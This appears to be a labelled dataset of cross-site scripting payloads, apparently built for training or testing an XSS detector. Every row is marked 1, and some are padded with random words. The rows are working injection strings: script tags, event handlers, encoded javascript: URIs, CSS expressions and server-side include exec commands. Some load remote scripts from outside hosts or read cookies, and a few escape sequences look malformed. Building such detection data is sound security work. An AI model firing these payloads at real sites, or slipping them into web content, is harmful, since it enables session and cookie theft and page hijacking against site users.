payload	xss
"`'><script>\x09javascript:alert(507)</script>	1
crossover "`'><script>\x0Ajavascript:alert(1)</script> enc	1
&quot`'&gt<script&gt\x0Ajavascript:alert(519)</script&gt	1
Akeldama &quot`&quot><script>\x0Bjavascript:alert(1)</script> astely	1
handkerchief's "`'>&ltscript>\x0Bjavascript:alert(535)&lt/script> mailbox's	1
"`'&gt<script&gt\x0Cjavascript:alert(1)</script&gt	1
trippler "`'&gt<script&gt\x0Cjavascript:alert(515)</script&gt	1
orig &quot`&quot>&ltscript>\x0Djavascript:alert(1)&lt/script> titanosaur	1
&quot`&quot&gt<script&gt\x20javascript:alert(1)</script&gt	1
stanzas "`'>&ltscript>\x20javascript:alert(536)&lt/script>	1
JHS "`'&gt<script&gt\x21javascript:alert(1)</script&gt	1
"`&quot&gt<script&gt\x2531javascript:alert(531)</script&gt	1
poriform "`'&gt<script&gt\x2Bjavascript:alert(1)</script&gt	1
over-abound "`'&gt&ltscript&gt\x2Bjavascript:alert(516)&lt/script&gt	1
Harkins "`'><script>\x3Bjavascript:alert(1)</script> Stasny	1
"`'&gt&ltscript&gt\x7Ejavascript:alert(1)&lt/script&gt	1
punctilios "`&quot><script>\x7Ejavascript:alert(521)</script>	1
yellow-bodied "`'&gt<script&gt\xC2\x85javascript:alert(1)</script&gt	1
proanimistic "`&quot><script>\xC2\x85javascript:alert(525)</script> intuitionalist	1
bird-dogged &quot`'&gt<script&gt\xC2\xA0javascript:alert(1)</script&gt	1
"`'&gt<script&gt\xC2\xA0javascript:alert(537)</script&gt	1
"`'&gt<script&gt\xE1\x9A\x80javascript:alert(1)</script&gt	1
&quot`&quot><script>\xE1\xA0\x8Ejavascript:alert(1)</script>	1
rewash "`'><script>\xE2\x80\x80javascript:alert(1)</script> remanning	1
"`'><script>\xE2\x80\x80javascript:alert(530)</script>	1
"`'&gt<script&gt\xE2\x80\x81javascript:alert(1)</script&gt	1
&quot`'><script>\xE2\x80\x82javascript:alert(1)</script>	1
embryonic "`&quot><script>\xE2\x80\x82javascript:alert(532)</script>	1
electrotautomerism "`&quot&gt<script&gt\xE2\x80\x83javascript:alert(1)</script&gt	1
chinny &quot`'><script>\xE2\x80\x83javascript:alert(527)</script> dueful	1
"`'><script>\xE2\x80\x84javascript:alert(1)</script>	1
nail-clipping "`'>&ltscript>\xE2\x80\x85javascript:alert(1)&lt/script>	1
hemicollin &quot`'><script>\xE2\x80\x85javascript:alert(509)</script> Duero	1
screw-topped "`'>&ltscript>\xE2\x80\x86javascript:alert(1)&lt/script>	1
"`'><script>\xE2\x80\x86javascript:alert(533)</script>	1
"`'>&ltscript>\xE2\x80\x87javascript:alert(1)&lt/script>	1
Duvida "`&quot><script>\xE2\x80\x87javascript:alert(522)</script> stoae	1
&quot`'><script>\xE2\x80\x88javascript:alert(1)</script>	1
house-room "`&quot>&ltscript>\xE2\x80\x88javascript:alert(510)&lt/script> diapirs	1
preerect &quot`'&gt<script&gt\xE2\x80\x89javascript:alert(1)</script&gt blindly	1
"`'>&ltscript>\xE2\x80\x89javascript:alert(508)&lt/script>	1
&quot`'>&ltscript>\xE2\x80\x8Ajavascript:alert(1)&lt/script>	1
digitinervate &quot`'&gt&ltscript&gt\xE2\x80\x8Ajavascript:alert(513)&lt/script&gt	1
&quot`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>	1
colonising "`'><script>\xE2\x80\x8Bjavascript:alert(528)</script> swordtail	1
universalised "`'>&ltscript>\xE2\x80\xA8javascript:alert(1)&lt/script>	1
obliterations "`&quot><script>\xE2\x80\xA8javascript:alert(512)</script>	1
poon "`'&gt&ltscript&gt\xE2\x80\xA9javascript:alert(1)&lt/script&gt	1
reemit "`'><script>\xE2\x80\xA9javascript:alert(524)</script> Malagigi	1
nonproducing "`&quot><script>\xE2\x80\xAFjavascript:alert(1)</script> maladministrative	1
Minthe &quot`'><script>\xE2\x80\xAFjavascript:alert(520)</script> unfailable	1
semidemented &quot`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>	1
bough's &quot`'><script>\xE2\x8523\x9Fjavascript:alert(523)</script> endobiotic	1
"`&quot>&ltscript>\xE3\x80\x80javascript:alert(1)&lt/script>	1
aconital "`&quot><script>\xE514\x9A\x80javascript:alert(514)</script>	1
moneron "`&quot><script>\xE534\xA0\x8Ejavascript:alert(534)</script>	1
Olsburg "`'&gt<script&gt\xEF\xBB\xBFjavascript:alert(1)</script&gt	1
postrecession "`&quot><script>\xEF\xBF\xAEjavascript:alert(1)</script>	1
&quot`'>&ltscript>\xEF\xBF\xAEjavascript:alert(526)&lt/script>	1
"`'&gt<script&gt\xEF\xBF\xBEjavascript:alert(1)</script&gt	1
bondless "`&quot>&ltscript>\xEF\xBF\xBEjavascript:alert(529)&lt/script> sprags	1
supplementarily &quot`'&gt<script&gt\xF0\x90\x96\x9Ajavascript:alert(1)</script&gt rewrite	1
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(517)</script>	1
"autofocus/onfocus=alert(1)//	1
"onclick=prompt(8)>"@x.y	1
"onclick=prompt(8)&gt<svg/onload=prompt(8)&gt"@x.y	1
frontier "onmouseover=alert(1)//	1
crafts # Special ;)	1
loopist %27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E ramiro	1
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E	1
hinderers %3Cx onxxx=alert(1) 	1
&#00;&lt/form>&ltinput type&#61;"date" onfocus="alert(1)">	1
twice-kidnaped &#13;&ltblink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}	1
stringiest &#34;&#62;<h1/onmouseover=&quot\u0061lert(1)&quot> lachrymosal	1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'	1
' onmouseover=alert(/XSS/)	1
&quot&quot`><script>/* *\x2Fjavascript:alert(1)// */</script>	1
sunblind '%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E	1
duct &quot&quot;!--"<XSS>=&{()}	1
Nedrud '-alert(1)-'	1
sayyids &quot-alert(1)//	1
'-eval("window['pro'%2B'mpt'](8)")-'	1
additives '-prompt(8)-' classico-	1
';a=prompt,a()//	1
intervener ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";	1
watchglass '<script>window.onload=function(){document.forms[0].message.value='1';}</script> chameleon	1
'>alert(1)</script><script/1=' 	1
succinimide '`">&lt\x00script>javascript:alert(1)&lt/script>	1
onerousness &quot`">&lt\x3Cscript>javascript:alert(1)&lt/script> bumpoff	1
'`&quot&gt<\x3Cscript&gtjavascript:alert(1)</script&gt        	1
metricize &quotonload=alert(1)><svg/1=&quot branchy	1
dark-flowing (alert)(1)	1
czechs */</script>'>alert(1)/*<script/1=' pot-hook	1
*/alert(1)">'onload="/*&ltsvg/1='	1
Henrietta */alert(1)</script&gt<script&gt/*	1
low-mindedly *{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */ Bourbonesque	1
*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */	1
*{color:red}</style>//["'`-->]]>]</div>	1
bardy --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> --> NGA	1
harsh-sounding --&gt<!-- --\x00&gt <img src=xxx:x onerror=javascript:alert(1)&gt --&gt gang-flower	1
mercaptol --><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->	1
slumlike --><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->	1
boatheader --&gt&lt!--*{color:red}   /* all UA */ outgeneraled	1
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>	1
Gymnadeniopsis //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>// poonce	1
bigwiggism //|\\ &ltscript //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ &lt/script //|\\ thankworthy	1
1&lta href=#>&ltline xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 />&lt/a>	1
tripudiate 1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>	1
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>	1
<! '=&quotfoo&quot><x foo='><img src=x onerror=alert(2)//'>	1
&lt! foo=">&ltscript>alert(91)&lt/script>">	1
unstoneable <! foo=&quot><script>javascript:alert(1)</script>&quot> cycadophyte	1
grasses <! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">	1
drysalter &lt! foo=&quot[[[x]]&quot>&ltx foo=&quot]foo>&ltscript>alert(91)&lt/script>&quot> insinuates	1
decentralised &lt!&quot/*"/*/&quot/*/"/*-->&lt/Script>&ltImage SrcSet=K */; OnError=confirm`1` //> microcentrosome	1
sanctioning <!--	1
&lt!-- IE 10 in IE5-9 Standards mode --&gt	1
remblai &lt!-- IE 5-9 standards mode --> Lilla	1
oppressor &lt!-- IE 6-9 --&gt baronial	1
alphabetarian <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->	1
motheriness &lt!-- Up to Opera 11.64 - see link below -->	1
&lt!-- Up to Opera 12.x -->	1
<!-- injection --><svg height=&quot50px&quot>	1
&lt!--#exec cmd="/bin/echo '&ltSCR'"--&gt&lt!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt&lt/SCRIPT&gt'"--&gt	1
<!--#exec cmd=&quot/bin/echo &quot<SCRIPT SRC&quot&quot--><!--#exec cmd=&quot/bin/echo &quot=http://ha.ckers.org/xss.js></SCRIPT>&quot&quot-->	1
<!--<img src="--><img src=x onerror=javascript:alert(1)//">	1
&lt!--&ltvalue>&lt![CDATA[&ltXML ID=I>&ltX>&ltC>&lt![CDATA[&ltIMG SRC="javas&lt![CDATA[cript:alert(&quotXSS&quot);">	1
<!--&gt<scRipT src=//14.rs&gt	1
<!--[if gte IE 4]&gt<SCRIPT&gtjavascript:alert(1);</SCRIPT&gt<![endif]--&gt	1
koniology <!--[if<img src=x onerror=alert(2)//]&gt --&gt//["'`--&gt]]&gt]</div&gt	1
&lt!--[if&ltimg src=x onerror=javascript:alert(1)//]> -->	1
ophthalmo-reaction <!--[if]&gt<script&gtjavascript:alert(1)</script --&gt	1
scimitars <!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->	1
phonogramically <!ATTLIST xsl:stylesheet id    ID    #REQUIRED&gt]&gt	1
polisman &lt!DOCTYPE doc [	1
&lt![>&ltimg src="]>&ltimg src=x onerror=alert(39)//">	1
erosional &lt![>&ltimg src="]>&ltimg src=x onerror=javascript:alert(1)//">	1
enslavedness <!a foo=x=`y&gt<img alt="`&gt<img src=xx:x onerror=alert(2)//"&gt fantasticly	1
<%	1
titiviller &lt% foo>&ltx foo=&quot%>&ltscript>alert(91)&lt/script>&quot>//[&quot'`-->]]>]&lt/div> radiumlike	1
<% foo&gt<x foo="%&gt<script&gtjavascript:alert(1)</script&gt"&gt	1
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>	1
<%78 onxxx=1 	1
<%<!--'%><script>alert(1);</script -->	1
<--`<iMG/srC=` onerror=confirm``> --!>	1
Batocrinidae <--`<img/src=` onerror=alert(1)> --!>	1
</ foo="><script>alert(91)</script>">	1
electr- </ foo="><script>javascript:alert(1)</script>">	1
machine-hour &lt// style=x:expression\28javascript:alert(1)\29> boccie	1
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN	1
difluence </TITLE&gt<SCRIPT&gtalert("XSS");</SCRIPT&gt	1
borotungstic </a>//[&quot'`-->]]>]</div>	1
Usun </font>/<svg><style>{src&#x3A;&quot<style/onload=this.onload=confirm(1)>&quot</font>/</style>	1
</form>	1
</form>//["'`-->]]>]</div>	1
&lt/html&gt//["'`--&gt]]&gt]&lt/div&gt	1
commentator </image>	1
saturate </math>//["&quot`-->]]>]</div>	1
tall-spired &lt/plaintext\>&lt/|\>&ltplaintext/onmouseover=prompt(1) pulicides	1
</scrip</script>t><img src =q onerror=prompt(8)>	1
croppa </script><img/*/src=&quotworksinchrome&colon;prompt&#x28;1&#x29;&quot/*/onerror=&quoteval(src)&quot> Pan-sclavism	1
Barnabite </script><script>alert(1)</script>	1
&lt/script&gt&ltsvg onload=alert(1)&gt	1
cryptanalytically </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-( Proparia	1
Aquifoliaceae &lt/style>//["'`-->]]>]&lt/div> ululated	1
</stylesheet>//["'`-->]]>]</div>	1
</svg&gt''<svg&gt<script 'AQuickBrownFoxJumpsOverTheLazyDog'&gtalert&#x28;1&#x29; {Opera}	1
</svg>//["'`-->]]>]</div>	1
lact- </template&gt	1
undercharge </xmp&gt	1
dead-face &lt&ltSCRIPT>%(payload)s//&lt&lt/SCRIPT>	1
thallodic &lt&ltSCRIPT&gtalert("XSS");//&lt&lt/SCRIPT&gt superiors	1
&lt&ltscr\0ipt/src=http://xss.com/xss.js>&lt/script	1
enfants <? &quot="foo"><x foo=&quot><img src=x onerror=alert(3)//&quot>//["&quot`-->]]>]</div>	1
<? echo(&quot<SCR)&quot;	1
misway <? echo(&quot<SCR)&quot;echo(&quotIPT&gtalert("XSS")</SCRIPT&gt&quot); ?&gt decreaseless	1
unexplorative <? foo="><script>alert(91)</script>"> environmentalism	1
hypersuggestibleness <? foo="&gt<script&gtjavascript:alert(1)</script&gt"&gt sun-baked	1
starstroke <? foo=&quot><x foo='?><script>alert(91)</script>'>&quot> ghrush	1
choule &lt? foo=">&ltx foo='?>&ltscript>javascript:alert(1)&lt/script>'>"> personifier	1
debyes <?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>	1
<?xml version="1.0"?&gt<html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt<html:script&gtjavascript:alert(1);</html:script&gt</html:html&gt	1
Jenufa <?xml-stylesheet type="text/xml" href="#stylesheet"?> Abington	1
miscredited &lt?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?&gt	1
Studley <A HREF=&quothtt p://6 6.000146.0x7.147/&quot>XSS</A>	1
billets <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A> six-footer	1
<A HREF="http://0102.0146.0007.00000223/">XSS</A>	1
glottochronology &ltA HREF=&quothttp://0x42.0x0000066.0x7.0x93/&quot&gtXSS&lt/A&gt Dostoyevsky	1
nonvagrant <A HREF=&quothttp://1113982867/&quot>XSS</A> bruise	1
<A HREF="http://66.102.7.147/">XSS</A>	1
thoracostracous <A href="javascript%26colon;confirm()"&gtclick	1
&ltA href=javas%26#99;ript:alert(1)>click	1
<BASE HREF="javascript:alert(&quotXSS&quot);//">	1
farriers <BASE HREF=&quotjavascript:javascript:alert(1);//&quot&gt inducts	1
Dayaks <BGSOUND SRC="javascript:alert('XSS');">	1
<BGSOUND SRC="javascript:javascript:alert(1);">	1
Ohiopyle <BODY BACKGROUND="javascript:alert(&quotXSS&quot)">	1
<BODY ONLOAD=alert('XSS')>	1
panbabylonian <BODY ONLOAD=javascript:alert(1)> Etta	1
&ltBODY ONLOAD=javascript:javascript:alert(1)>	1
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>	1
coenjoy <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> socked	1
midwived <BR SIZE=&quot&{alert(&quotXSS&quot)}&quot> Godthaab	1
gabbing <BR SIZE="&{javascript:alert(1)}"&gt	1
Wanaque &ltD3&quot&lt&quot/OncLick=&quot1>[confirm``]&quot&lt&quot>z	1
gateado &ltD3/OnMouSEenTer=[2].find(confirm)>z begetting	1
identificational &ltD3/OnpOinTeReENter=confirm``>click here	1
benzil <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"> Olonos	1
<DIV STYLE="background-image: url(javascript:alert('XSS'))">	1
basisolute <DIV STYLE="background-image: url(javascript:javascript:alert(1))">	1
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">	1
<DIV STYLE="width: expression(alert(&quotXSS&quot));"&gt	1
warl <DIV STYLE="width:expression(javascript:alert(1));"&gt codrive	1
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt</EMBED&gt	1
unmedicable &ltFRAMESET&gt&ltFRAME SRC="javascript:alert(&quotXSS&quot);"&gt&lt/FRAMESET&gt chromesthesia	1
refolded &ltFRAMESET>&ltFRAME SRC="javascript:javascript:alert(1);">&lt/FRAMESET>	1
galany &ltHEAD>&ltMETA HTTP-EQUIV=&quotCONTENT-TYPE&quot CONTENT=&quottext/html; charset=UTF-7&quot> &lt/HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-	1
overunsuitable <HEAD><META HTTP-EQUIV=&quotCONTENT-TYPE&quot CONTENT=&quottext/html; charset=UTF-7&quot> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-	1
Drona <HTML xmlns:xss&gt<?import namespace="xss" implementation="%(htc)s"&gt<xss:xss&gtXSS</xss:xss&gt</HTML&gt""","XML namespace."),("""<XML ID="xss"&gt<I&gt<B&gt&lt;IMG SRC="javas<!-- --&gtcript:javascript:alert(1)"&gt;</B&gt</I&gt</XML&gt<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt</SPAN&gt succored	1
semesters &ltHTML&gt&ltBODY&gt quasi-capably	1
morion <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML> Fadiman	1
<IFRAME SRC="javascript:alert(&quotXSS&quot);"></IFRAME>	1
<IFRAME SRC=&quotjavascript:javascript:alert(1);&quot&gt</IFRAME&gt	1
callbacks <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>	1
&ltIMG """>&ltSCRIPT>alert("XSS")&lt/SCRIPT>">	1
&ltIMG DYNSRC="javascript:alert('XSS')">	1
<IMG DYNSRC="javascript:javascript:alert(1)">	1
Herries &ltIMG LOWSRC="javascript:alert('XSS')"&gt	1
&ltIMG LOWSRC=&quotjavascript:javascript:alert(1)&quot>	1
tirrwirr <IMG SRC= onmouseover="alert('xxs')"> endomictic	1
pancratic <IMG SRC=&quot &#14;  javascript:alert(&quotXSS&quot);&quot>	1
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">	1
newswriting &ltIMG SRC="jav ascript:alert('XSS');"> Cuon	1
<IMG SRC="jav    ascript:javascript:alert(1);">	1
histogenesis <IMG SRC="jav ascript:alert(&quotXSS&quot);"> canzonas	1
forbid &ltIMG SRC=&quotjav&#x09;ascript:alert('XSS');&quot>	1
juramentados &ltIMG SRC=&quotjav&#x0A;ascript:alert('XSS');&quot>	1
reignore <IMG SRC=&quotjav&#x0D;ascript:alert(&quotXSS&quot);&quot>	1
oleander <IMG SRC="javascript:alert('XSS')"	1
vegeterianism <IMG SRC=&quotjavascript:alert(&quotXSS&quot);&quot>	1
propatronage <IMG SRC="javascript:javascript:alert(1)"	1
incorporating &ltIMG SRC=&quotjavascript:javascript:alert(1);&quot>	1
<IMG SRC="livescript:[code]"&gt	1
<IMG SRC="mocha:[code]">	1
coonier <IMG SRC=# onmouseover=&quotalert('xxs')&quot>	1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>	1
adiabolist <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;&gt	1
&ltIMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt	1
<IMG SRC=&{javascript:alert(1);};>	1
Schloss <IMG SRC='vbscript:msgbox("XSS")'>	1
lightage <IMG SRC=JaVaScRiPt:alert('XSS')>	1
zoodynamic &ltIMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt	1
idioplasmatic <IMG SRC=`javascript:javascript:alert(1)`>	1
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>	1
disadorn <IMG SRC=javascript:alert(&quotXSS&quot)&gt onionskins	1
disbursements <IMG SRC=javascript:alert(&quot;XSS&quot;)&gt vehiculary	1
&ltIMG SRC=javascript:alert('XSS')>	1
secus <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> marlite	1
rebatos <IMG SRC=javascript:alert(‘XSS’)>      	1
<IMG SRC=javascript:javascript:alert(1)>	1
<IMG SRC=”javascript:alert(‘XSS’);”&gt	1
sandstorm &ltIMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"> resolutionist	1
kumyses <IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))"&gt	1
indication &ltIMG onmouseover=&quotalert('xxs')&quot> Borana	1
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">	1
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">	1
bandeau <LAYER SRC="%(scriptlet)s"&gt</LAYER&gt	1
glossoscopy <LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>	1
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">	1
collegatary <LINK REL="stylesheet" HREF="javascript:alert(&quotXSS&quot);"&gt fermage	1
cavo-relievo &ltLINK REL="stylesheet" HREF="javascript:javascript:alert(1);">	1
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">	1
nirvana &ltMETA HTTP-EQUIV="Link" Content="&lthttp://ha.ckers.org/xss.css>; REL=stylesheet">	1
LLD &ltMETA HTTP-EQUIV="Link" Content="&ltjavascript:alert('XSS')>; REL=stylesheet">	1
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(&quotXSS&quot)&lt;/SCRIPT&gt;"&gt	1
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT&gtalert('XSS')</SCRIPT&gt"&gt	1
aneurism <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt Pearson	1
shouldna <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);"> noncertified	1
tophetic <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"> Weisburgh	1
Lyallpur <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt	1
